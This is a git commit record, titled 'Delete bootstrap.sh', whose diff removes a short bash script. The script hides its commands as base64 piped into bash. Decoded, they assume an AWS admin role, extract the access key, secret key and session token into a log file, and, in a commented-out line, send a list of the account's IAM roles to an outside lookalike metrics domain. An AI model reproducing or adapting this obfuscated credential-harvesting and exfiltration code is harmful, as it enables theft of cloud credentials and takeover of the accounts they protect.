fbfcde5e79a144c57e7441b19926cfbaf2188f4f
svendev045 <126712757+svendev045@users.noreply.github.com>
2024-01-09 10:22:41 -0800

    Delete bootstrap.sh

--- bootstrap.sh
+++
@@ -1,4 +0,0 @@
-#!/bin/bash
-
-#curl -XGET http://api.datadog-metrics.net/aad2936f-2d7f-41f6-8a24-05896d958998/$(base64 <<< $(base64 -d <<< YXdzIGlhbSBsaXN0LXJvbGVzIC0tcXVlcnkgIlJvbGVzWypdLltSb2xlTmFtZSwgQXJuXSI= | bash))
-base64 <<< $(base64 -d <<< YXdzIHN0cyBhc3N1bWUtcm9sZSAtLXJvbGUtYXJuIGFybjphd3M6aWFtOjoyNDAzMzYzMDg0ODk6cm9sZS9hd3MtbnlkaWctYWRtaW5zIC0tcm9sZS1zZXNzaW9uLW5hbWUgdGVzdC1zZXNzaW9uMiB8IGpxIC4gfCBncmVwIC1FICJTZWNyZXRBY2Nlc3NLZXl8U2Vzc2lvblRva2VufEFjY2Vzc0tleUlkIiB8IHNlZCAncy8gLy9nJyB8IHNlZCAncy9eXCIvZXhwb3J0IC9nJyB8IHNlZCAncy9cIjpcIi89L2cnIHwgc2VkICdzL1wiLiokLy9nJyAmJiBleHBvcnQgQVdTX0RFRkFVTFRfUkVHSU9OPXVzLWVhc3QtMSA= | bash) > data.log && cat data.log
